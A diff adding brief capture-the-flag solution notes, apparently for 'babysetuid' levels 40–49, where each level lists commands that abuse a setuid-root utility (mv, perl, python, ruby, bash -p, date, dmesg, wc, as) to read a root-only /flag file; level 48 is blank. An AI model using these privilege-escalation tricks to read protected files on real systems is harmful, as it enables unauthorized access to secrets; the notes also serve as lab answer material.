@@ -95,3 +95,49 @@ LVL 38
 cd /
 chmod a+r flag
 cat flag
+
+LVL 40
+mv /flag /bin/mv
+cd /challenge
+./babysetuid_level40
+cat mv
+
+LVL 41
+perl -pe '$_ .= "\n"' /flag
+
+LVL 42
+### script.py ###
+
+with open('/flag', 'r') as f:
+    print(f.read())
+
+#################
+python script.py
+
+LVL 43
+### script.rb ###
+
+File.open('/flag', 'r') do |f|
+    puts f.read
+  end
+
+#################
+ruby script.rb
+
+LVL 44
+bash -p
+cat /flag
+
+LVL 45
+date -f /flag
+
+LVL 46
+dmesg -F /flag
+
+LVL 47
+wc --files0-from=/flag
+
+LVL 48
+
+LVL 49
+as /flag
